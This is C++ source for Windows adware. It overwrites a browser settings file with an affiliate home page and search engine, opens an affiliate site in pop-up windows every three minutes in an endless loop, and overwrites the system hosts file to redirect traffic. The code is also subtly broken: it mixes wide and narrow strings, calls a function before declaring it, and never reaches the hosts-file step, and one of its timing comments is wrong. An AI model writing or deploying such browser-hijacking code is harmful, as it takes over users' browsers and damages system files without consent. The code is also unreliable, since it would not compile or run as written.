#include <windows.h>
#include <fstream>
#include <string>

// Function to change browser settings
void modifyBrowserSettings(std::wstring path, std::wstring homePage, std::wstring defaultSearchEngine) {
    // Change Home Page and Default Search Engine in the browser's settings file
    std::ofstream settingsFile(path);
    if (settingsFile.is_open()) {
        settingsFile << L"Home Page: " + homePage << std::endl;
        settingsFile << L"Default Search Engine: " + defaultSearchEngine << std::endl;
        settingsFile.close();
    }
}

// Function to generate pop-ups
void popUpGenerator() {
    // Create a background thread that opens browser windows
    HANDLE popupThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)browserWindowOpener, NULL, 0, NULL);
    
    while (true) {
        Sleep(180000); // Wait for 3 minutes before opening a new window

        // Open the affiliate website in a browser window
        ShellExecuteA(NULL, L"open", "http://affiliatewebsite.com", NULL, NULL, SW_SHOW);
        
        // Close the thread after a few hours (1800 seconds)
        Sleep(1800000);
        TerminateThread(popupThread, 0);
    }
}

// Function to modify local hosts file
void trafficRedirection() {
    std::wstring path = L"C:\\Windows\\System32\\drivers\\etc\\hosts";
    std::ofstream hostsFile(path);

    if (hostsFile.is_open()) {
        // Modify the hosts file to redirect search traffic to ad-filled domains
        hostsFile << L"127.0.0.1 www.example.com\n"; 
        hostsFile.close();
    }
}

// Function to open browser windows
DWORD WINAPI browserWindowOpener(LPVOID lpParam) {
    while (true) {
        Sleep(180000); // Wait for 3 minutes before opening a new window

        // Open the affiliate website in a browser window
        ShellExecuteA(NULL, L"open", "http://affiliatewebsite.com", NULL, NULL, SW_SHOW);
    }
}

// Main function
int main() {
    std::wstring path = L"C:\\Program Files\\Browser\\Settings.txt";
    std::wstring homePage = L"http://affiliatehomepagewebsite.com";
    std::wstring defaultSearchEngine = L"Affiliate Search Engine";

    modifyBrowserSettings(path, homePage, defaultSearchEngine);
    popUpGenerator();
    trafficRedirection();

    return 0;
}
